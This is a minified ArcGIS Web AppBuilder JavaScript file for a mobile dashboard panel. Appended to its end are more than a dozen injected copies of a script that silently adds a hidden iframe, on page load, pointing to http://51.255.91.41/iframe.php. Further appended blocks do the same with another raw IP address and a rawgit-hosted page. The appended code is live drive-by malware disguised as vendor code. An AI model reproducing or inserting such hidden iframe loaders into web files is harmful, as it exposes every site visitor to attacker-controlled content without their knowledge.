// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:themes/DashboardTheme/panels/MobilePanel/Panel.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"map-area" data-dojo-attach-point\x3d"mapNode"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"splitter" data-dojo-attach-point\x3d"splitterNode"\x3e\r\n    \x3cdiv class\x3d"splitter_handler" data-dojo-attach-point\x3d"splitterHandler"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"widget-area" data-dojo-attach-point\x3d"widgetContainerNode"\x3e\r\n    \x3cdiv class\x3d"panel-content" data-dojo-attach-point\x3d"containerNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"panel-header"\x3e\r\n      \x3cdiv class\x3d"previous-arrow jimu-float-leading jimu-leading-margin1" data-dojo-attach-point\x3d"previousArrow"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"next-arrow  jimu-float-trailing jimu-trailing-margin1" data-dojo-attach-point\x3d"nextArrow"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"label" data-dojo-attach-point\x3d"labelNode"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"panel-footer" data-dojo-attach-point\x3d"footerNode"\x3e\r\n      \x3cdiv class\x3d"count jimu-float-trailing jimu-trailing-margin2" data-dojo-attach-point\x3d"countNode"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dijit/_WidgetBase dojo/dom-construct dojo/dom-geometry dojo/dom-style dojo/dom-class dojo/on dojo/Deferred dojo/query dojo/debounce dojo/Evented dojo/dnd/move dojo/_base/fx dojo/fx dijit/_TemplatedMixin dojo/text!./Panel.html".split(" "),function(v,n,w,x,q,p,c,m,r,u,y,z,A,B,h,t,C,D){return v([x,C,A],{baseClass:"jimu-dnd-mobile-panel",templateString:D,mobileLayout:1,layoutId:"",mapId:"",widgetIds:null,panels:null,currentIndex:0,leftPos:0,
count:"",title:"",widgetMode:0,layoutManager:null,_moveStartX:0,_moveStartY:0,postCreate:function(){this.inherited(arguments);this.setMobileLayout(this.mobileLayout);q.place(this.mapId,this.mapNode);this.own(r(this.previousArrow,"click",n.hitch(this,this._switchPrevious)));this.own(r(this.nextArrow,"click",n.hitch(this,this._switchNext)));this._initSplitter();c.set(this.footerNode,"opacity","0");this.resize()},clearPanels:function(){this.widgetIds=[];this.panels=[];q.empty(this.containerNode);c.set(this.containerNode,
"left",0);this.currentIndex=0;this._updateHeader(this.currentIndex-1,this.currentIndex)},setPanels:function(a,b){this.widgetIds=a;this.panels=b||{};this.currentIndex=0;1>=this.widgetIds.length?(c.set(this.previousArrow,"display","none"),c.set(this.nextArrow,"display","none")):(c.set(this.previousArrow,"display","block"),c.set(this.nextArrow,"display","block"));c.set(this.footerNode,"opacity","0");this._openPanel();this._updateHeader(this.currentIndex-1,this.currentIndex)},_resizeActivePanel:function(){if(this.widgetIds&&
this.panels){var a=this.panels[this.widgetIds[this.currentIndex]];a&&"function"===typeof a.resize&&a.resize()}},_openPanel:function(){var a=this.widgetIds[this.currentIndex],b=this.panels[a],f;if(b&&b.domNode){if(0===y('div[data-widgetId\x3d"'+a+'"]',this.containerNode).length){var e=q.create("div",{"data-widgetId":a,"class":"dnd-mobile-container"},this.containerNode);b.placeAt(e)}this.layoutManager.panelManager.openPanel(b)}else this.layoutManager._loadDashboardWidget(this.widgetIds[this.currentIndex]).then(n.hitch(this,
function(b){if(b){var d=q.create("div",{"data-widgetId":a,"class":"dnd-mobile-container"},this.containerNode);b.placeAt(d);this.panels[a]=b;this.layoutManager.panelManager.openPanel(b);this.labelNode.innerHTML=b.config.label}}));w.forEach(this.widgetIds,n.hitch(this,function(b){b!==a&&(f=this.panels[b])&&this.layoutManager.panelManager.closePanel(f)}))},_initSplitter:function(){this.moveable&&this.moveable.destroy();this.moveable=new B.parentConstrainedMoveable(this.splitterNode,{area:"content",within:!0});
this.own(r(this.moveable,"MoveStart",n.hitch(this,this.onMoveStart)));this.own(r(this.moveable,"Moving",z(n.hitch(this,this.onMoving),50)));this.own(r(this.moveable,"MoveStop",n.hitch(this,this.onMoveStop)))},destroy:function(){this.moveable&&(this.moveable.destroy(),this.moveable=null);var a=this.panels[this.widgetIds[this.currentIndex]];a&&this.layoutManager.panelManager.closePanel(a);q.empty(this.containerNode);this.inherited(arguments)},setMobileLayout:function(a){2===a?(this.mobileLayout=2,m.remove(this.domNode,
"portrait"),m.add(this.domNode,"landscape")):(this.mobileLayout=1,m.remove(this.domNode,"landscape"),m.add(this.domNode,"portrait"))},resize:function(){(2===this.mobileLayout?this._restoreLandscapeLayout():this._restorePortraitLayout()).then(n.hitch(this,function(){var a=p.getMarginBox(this.widgetContainerNode);this.emit("resized",{left:a.l,top:a.t,width:a.w,height:a.h})}))},_updateHeader:function(a,b){if(this.widgetIds&&0<this.widgetIds.length){var f=this.widgetIds[b],e=this.widgetIds[a],k=this.panels[f],
d=this.panels[e];this.countNode.innerHTML=b+1+"/"+this.widgetIds.length;a&&d&&(a=d.getWidgetById(e),a.onDeActive());if(k){if(f=k.getWidgetById(f))f.onActive(),this.labelNode.innerHTML=f.label}else this.labelNode.innerHTML=""}else this.labelNode.innerHTML="",this.countNode.innerHTML="";0===b?m.add(this.previousArrow,"disabled"):m.remove(this.previousArrow,"disabled");b===this.widgetIds.length-1?m.add(this.nextArrow,"disabled"):m.remove(this.nextArrow,"disabled")},_switchPrevious:function(){0<this.currentIndex&&
(this._updateHeader(this.currentIndex,this.currentIndex-1),this.currentIndex--,this._play())},_switchNext:function(){this.currentIndex<this.widgetIds.length-1&&(this._updateHeader(this.currentIndex,this.currentIndex+1),this.currentIndex++,this._play())},_play:function(){var a=p.getMarginBox(this.containerNode);h.animateProperty({node:this.containerNode,duration:300,properties:{left:-this.currentIndex*a.w},onEnd:n.hitch(this,function(){c.set(this.footerNode,"opacity","1");h.animateProperty({node:this.footerNode,
duration:2100,properties:{opacity:0}}).play()})}).play();this._openPanel()},onMoveStart:function(a){this._moveStartX=c.get(a.node,"left");this._moveStartY=c.get(a.node,"top")},onMoving:function(a){if(a&&a.node){var b=c.get(a.node,"left")-this._moveStartX;a=c.get(a.node,"top")-this._moveStartY;1===this.mobileLayout?(c.set(this.widgetContainerNode,"top",this._moveStartY+a+16+"px"),c.set(this.splitterNode,"top",this._moveStartY+a+"px"),c.set(this.splitterNode,"left","0")):2===this.mobileLayout&&(c.set(this.widgetContainerNode,
"left",this._moveStartX+b+16+"px"),c.set(this.splitterNode,"left",this._moveStartX+b+"px"),c.set(this.splitterNode,"top","0"))}},onMoveStop:function(a){var b=c.get(a.node,"left")-this._moveStartX;a=c.get(a.node,"top")-this._moveStartY;1===this.mobileLayout?this._resizeWidgetVertically(a):2===this.mobileLayout&&this._resizeWidgetHorizontally(b)},_resizeWidgetVertically:function(a){var b=p.getMarginBox(this.layoutId),f=p.getMarginBox(this.containerNode).h/3,e=!1,k=[],f=150<f?150:f,d,g,c,l;if(0===this.widgetMode&&
a<-f)this.widgetMode=2,d=0,g=.5*-b.h,c=.5*b.h,l=b.h-16,e=!0,this.emit("resized",{left:0,top:d+16,width:b.w,height:l});else if(0===this.widgetMode&&a>f)this.widgetMode=1,d=b.h-16,c=b.h-16,g=0,l=.5*b.h-16,e=!0,this.emit("resized",{left:0,top:d+16,width:b.w,height:l});else if(1===this.widgetMode&&a<-f||2===this.widgetMode&&a>f)this.widgetMode=0,d=.5*b.h,c=.5*b.h,g=0,l=.5*b.h-16,e=!0,this.emit("resized",{left:0,top:d+16,width:b.w,height:l});e?(k.push(h.animateProperty({node:this.widgetContainerNode,duration:300,
properties:{top:d+16,height:l}})),k.push(h.animateProperty({node:this.containerNode,duration:300,properties:{left:-this.currentIndex*b.w,width:b.w}})),k.push(h.animateProperty({node:this.splitterNode,duration:300,properties:{top:d}})),k.push(h.animateProperty({node:this.mapNode,duration:300,properties:{height:c,top:g}})),a=t.combine(k),a.onEnd=n.hitch(this,this._resizeActivePanel),a.play()):this._restorePortraitLayout()},_resizeWidgetHorizontally:function(a){var b=p.getMarginBox(this.layoutId),f=
p.getMarginBox(this.containerNode).w/3,e=!1,c=[],f=150<f?150:f,d,g,m,l;if(0===this.widgetMode&&a<-f)this.widgetMode=2,d=0,m=b.w-320-16,g=-m,l=b.w-16,e=!0,this.emit("resized",{left:d+16,top:0,width:l,height:b.h});else if(0===this.widgetMode&&a>f)this.widgetMode=1,d=m=b.w-16,g=0,l=320,e=!0,this.emit("resized",{left:d+16,top:0,width:l,height:b.h});else if(1===this.widgetMode&&a<-f||2===this.widgetMode&&a>f)this.widgetMode=0,d=m=b.w-320-16,g=0,l=320,e=!0,this.emit("resized",{left:d+16,top:0,width:l,height:b.h});
e?(c.push(h.animateProperty({node:this.widgetContainerNode,duration:300,properties:{left:d+16,width:l}})),c.push(h.animateProperty({node:this.containerNode,duration:300,properties:{left:-this.currentIndex*l,width:l}})),c.push(h.animateProperty({node:this.splitterNode,duration:300,properties:{left:d}})),c.push(h.animateProperty({node:this.mapNode,duration:300,properties:{width:m,left:g}})),a=t.combine(c),a.onEnd=n.hitch(this,this._resizeActivePanel),a.play()):this._restoreLandscapeLayout()},_restorePortraitLayout:function(){var a=
p.getMarginBox(this.layoutId),b=[],c=new u,e,k,d,g;0===this.widgetMode?(e=.5*a.h,d=.5*a.h,k=0,g=a.h-d-16):2===this.widgetMode?(e=0,k=.5*-a.h,d=.5*a.h,g=a.h-16):1===this.widgetMode&&(e=a.h-16,d=a.h-16,k=0,g=.5*a.h-16);b.push(h.animateProperty({node:this.widgetContainerNode,duration:300,properties:{left:0,top:e+16,height:g,width:a.w}}));b.push(h.animateProperty({node:this.containerNode,duration:300,properties:{left:-this.currentIndex*a.w,width:a.w}}));b.push(h.animateProperty({node:this.splitterNode,
duration:300,properties:{top:e,left:0,width:a.w,height:16}}));b.push(h.animateProperty({node:this.mapNode,duration:300,properties:{height:d,width:a.w,top:k,left:0}}));a=t.combine(b);a.onEnd=n.hitch(this,function(){this._resizeActivePanel();c.resolve()});a.play();return c},_restoreLandscapeLayout:function(){var a=p.getMarginBox(this.layoutId),b=[],c=new u,e,k,d,g;0===this.widgetMode?(e=d=a.w-320-16,k=0,g=320):2===this.widgetMode?(e=0,d=a.w-320-16,k=-d,g=a.w-16):1===this.widgetMode&&(e=d=a.w-16,k=0,
g=320);b.push(h.animateProperty({node:this.widgetContainerNode,duration:300,properties:{top:0,left:e+16,width:g,height:a.h}}));b.push(h.animateProperty({node:this.containerNode,duration:300,properties:{left:-this.currentIndex*g,width:g}}));b.push(h.animateProperty({node:this.splitterNode,duration:300,properties:{left:e,top:0,height:a.h,width:16}}));b.push(h.animateProperty({node:this.mapNode,duration:300,properties:{width:d,height:a.h,left:k,top:0}}));a=t.combine(b);a.onEnd=n.hitch(this,function(){this._resizeActivePanel();
c.resolve()});a.play();return c}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});